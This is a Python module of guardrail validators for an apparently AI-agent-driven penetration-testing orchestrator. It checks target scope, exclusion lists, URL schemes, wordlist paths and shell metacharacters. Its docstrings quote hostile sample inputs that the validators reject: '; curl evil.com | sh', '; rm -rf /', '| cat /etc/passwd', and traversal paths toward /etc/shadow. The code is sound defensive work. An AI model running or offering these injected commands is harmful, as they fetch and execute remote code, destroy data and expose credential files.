"""
Validation helpers for orchestration guardrails.
"""

from __future__ import annotations

import re
from ipaddress import ip_address, ip_network
from typing import Any, Dict, Iterable, List


def target_in_scope(target: str, scope: Iterable[str]) -> bool:
    entries = [item for item in scope if item]
    if not entries:
        return False

    try:
        target_ip = ip_address(target)
    except ValueError:
        # Hostname: allow exact match in scope list.
        return target in entries

    for entry in entries:
        try:
            if target_ip in ip_network(entry, strict=False):
                return True
        except ValueError:
            if target == entry:
                return True
    return False


def has_service_version_intel(discovered_targets: Dict[str, Dict[str, Any]]) -> bool:
    for target_data in (discovered_targets or {}).values():
        services = target_data.get("services", {}) if isinstance(target_data, dict) else {}
        for service in services.values():
            if isinstance(service, dict):
                version = str(service.get("version") or "").strip()
            else:
                version = ""
            if version:
                return True
    return False


def list_recent_agent_names(agent_log: List[Dict[str, Any]], n: int = 6) -> List[str]:
    names: List[str] = []
    for entry in (agent_log or [])[-n:]:
        if isinstance(entry, dict):
            agent_name = str(entry.get("agent") or "").strip().lower()
        else:
            agent_name = str(getattr(entry, "agent", "")).strip().lower()
        if agent_name:
            names.append(agent_name)
    return names


def has_agent_run(agent_log: List[Dict[str, Any]], agent_name: str) -> bool:
    expected = agent_name.strip().lower()
    return any(name == expected for name in list_recent_agent_names(agent_log, n=len(agent_log)))


# ============================================================================
# EXCLUSION LIST VALIDATION
# ============================================================================

def normalise_exclusion_list(raw_list: Iterable[str]) -> List[str]:
    """
    Parse and deduplicate an exclusion list, stripping blank entries and
    normalising CIDRs to their canonical form.

    Args:
        raw_list: Iterable of IP addresses, CIDR blocks, or hostnames.

    Returns:
        Deduplicated list of normalised strings ready for use with
        ``is_excluded_target``.

    Examples::

        normalise_exclusion_list(["10.0.0.1", "10.0.0.1", "192.168.1.0/24"])
        # ["10.0.0.1", "192.168.1.0/24"]

        normalise_exclusion_list(["", "  ", "bad/cidr/32"])
        # []  — invalid entries silently dropped
    """
    seen: set = set()
    result: List[str] = []
    for entry in raw_list:
        cleaned = str(entry or "").strip()
        if not cleaned or cleaned in seen:
            continue
        # Try plain IP first (avoid normalising "10.0.0.1" → "10.0.0.1/32").
        try:
            normalised = str(ip_address(cleaned))
            if normalised not in seen:
                seen.add(normalised)
                result.append(normalised)
            continue
        except ValueError:
            pass
        # Try CIDR block.
        try:
            normalised = str(ip_network(cleaned, strict=False))
            if normalised not in seen:
                seen.add(normalised)
                result.append(normalised)
            continue
        except ValueError:
            pass
        # Treat as hostname — keep as-is.
        if cleaned not in seen:
            seen.add(cleaned)
            result.append(cleaned)
    return result



def is_excluded_target(target: str, exclusion_list: Iterable[str]) -> bool:
    """
    Return ``True`` if a target IP, hostname, or CIDR is explicitly excluded
    by the operator's exclusion list.

    Matching rules
    --------------
    - Exact match on IPs and hostnames.
    - IP inside an excluded CIDR block.
    - CIDR blocks are matched if they overlap with an excluded CIDR.

    Args:
        target:         IP address, hostname, or CIDR to test.
        exclusion_list: Iterable of excluded IPs, CIDRs, or hostnames.
                        Use ``normalise_exclusion_list`` to pre-process it.

    Returns:
        ``True`` if the target should be excluded from scanning.

    Examples::

        is_excluded_target("10.0.0.5", ["10.0.0.0/24"])    # True
        is_excluded_target("10.0.0.5", ["192.168.1.0/24"]) # False
        is_excluded_target("evil.com",  ["evil.com"])       # True
    """
    exclusions = [e for e in exclusion_list if e]
    if not exclusions:
        return False

    candidate = str(target or "").strip()
    if not candidate:
        return False

    # Try IP / CIDR matching first.
    try:
        target_net = ip_network(candidate, strict=False)
    except ValueError:
        # Hostname: exact match check only.
        return candidate in exclusions

    for entry in exclusions:
        try:
            excl_net = ip_network(entry, strict=False)
            if target_net.overlaps(excl_net):
                return True
        except ValueError:
            # hostname in exclusion list — compare as string
            if candidate == entry:
                return True
    return False


# ============================================================================
# WEB / URL VALIDATION
# ============================================================================

# Schemes we will ever fuzz. HTTPS is allowed for scope-locked boxes.
_ALLOWED_SCHEMES = frozenset({"http", "https"})

# Wordlists must live under one of these container paths.
_ALLOWED_WORDLIST_PREFIXES = (
    "/usr/share/wordlists/",
    "/opt/wordlists/",
    "/app/wordlists/",
)

# Shell metacharacters that must never appear in additional_args.
_SHELL_INJECTION_RE = re.compile(r"[;&|`$<>\\]")


def is_valid_target_url(url: str, target_scope: Iterable[str]) -> bool:
    """
    Validate that a URL is syntactically sound, uses an allowed scheme,
    and resolves to a host that is within the authorised target scope.

    Scope matching
    --------------
    The function extracts the hostname from the URL and checks it against
    every entry in ``target_scope``:
    - Hostname exact match   : ``"automotive-testbed"``
    - IPv4 inside CIDR block : ``"172.20.0.0/16"``
    - Bare IPv4 exact match  : ``"172.20.0.5"``

    Args:
        url:          Full target URL, e.g. ``"http://automotive-testbed:8000"``.
        target_scope: Iterable of allowed CIDRs, IPs, or hostnames.

    Returns:
        ``True`` if the URL is safe to use as a fuzzing target.

    Examples::

        is_valid_target_url("http://automotive-testbed:8000", ["automotive-testbed"])
        # True

        is_valid_target_url("http://evil.com/", ["172.20.0.0/16"])
        # False — out of scope

        is_valid_target_url("ftp://172.20.0.5", ["172.20.0.0/16"])
        # False — disallowed scheme
    """
    import urllib.parse

    if not url or not isinstance(url, str):
        return False

    try:
        parsed = urllib.parse.urlparse(url)
    except Exception:
        return False

    # Scheme must be http or https.
    if parsed.scheme.lower() not in _ALLOWED_SCHEMES:
        return False

    # Must have a non-empty host.
    hostname = (parsed.hostname or "").strip()
    if not hostname:
        return False

    # Delegate to existing scope checker.
    return target_in_scope(hostname, target_scope)


def is_safe_wordlist_path(wordlist_path: str) -> bool:
    """
    Ensure the requested wordlist file is located within an allowed
    directory and doesn't use path-traversal tricks.

    This prevents an LLM from accidentally (or maliciously) reading
    sensitive host files like ``/etc/passwd`` via the wordlist flag.

    Allowed prefixes (inside the Kali container):
      - ``/usr/share/wordlists/``
      - ``/opt/wordlists/``
      - ``/app/wordlists/``

    Args:
        wordlist_path: Absolute path string as it would be passed to
                       gobuster or ffuf with the ``-w`` flag.

    Returns:
        ``True`` if the path is safe to use.

    Examples::

        is_safe_wordlist_path("/usr/share/wordlists/dirb/common.txt")  # True
        is_safe_wordlist_path("/etc/passwd")                           # False
        is_safe_wordlist_path("/usr/share/wordlists/../../etc/shadow") # False
    """
    import os

    if not wordlist_path or not isinstance(wordlist_path, str):
        return False

    # Normalise to catch ".." traversal.
    normalised = os.path.normpath(wordlist_path)

    for prefix in _ALLOWED_WORDLIST_PREFIXES:
        if normalised.startswith(prefix):
            return True

    return False


def is_safe_additional_args(additional_args: str) -> bool:
    """
    Check that a free-form ``additional_args`` string doesn't contain
    shell-injection metacharacters.

    Tool wrappers pass ``additional_args`` directly into a shell command
    (e.g. ``gobuster dir -u ... {additional_args}``).  An LLM could
    theoretically emit something like ``; curl evil.com | sh``, so we
    block any string containing shell metacharacters.

    Blocked characters: ``;  &  |  \`  $  <  >  \\``

    Args:
        additional_args: The string an agent intends to append to a
                         tool command line.

    Returns:
        ``True`` if the string is safe to append.

    Examples::

        is_safe_additional_args("-e .php,.html")         # True
        is_safe_additional_args("-recursion")            # True
        is_safe_additional_args("; rm -rf /")            # False
        is_safe_additional_args("-H 'X: val' | cat /etc/passwd")  # False
    """
    if additional_args is None:
        return True
    return not bool(_SHELL_INJECTION_RE.search(additional_args))
